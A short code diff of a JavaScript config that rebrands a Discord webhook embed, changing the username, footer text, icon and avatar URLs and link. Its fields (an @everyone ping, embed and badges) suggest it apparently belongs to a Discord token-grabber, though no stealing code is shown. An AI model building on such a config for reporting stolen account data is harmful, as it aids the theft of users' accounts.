@@ -23,13 +23,13 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "ertugrul | katliam19",
+        username: "ERTUGRUL",
         footer: {
-            text: `ertugrul | katliam19`,
-            icon_url: "https://cdn.discordapp.com/attachments/1092853116203966466/1096887325277028362/image.png",
+            text: `ERTUGRUL`,
+            icon_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
         },
-        href: "https://",
-        avatar_url: "https://cdn.discordapp.com/attachments/1092853116203966466/1096887325277028362/image.png"
+        href: "www.youtube.com",
+        avatar_url: "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless"
     },
 
     badges: {
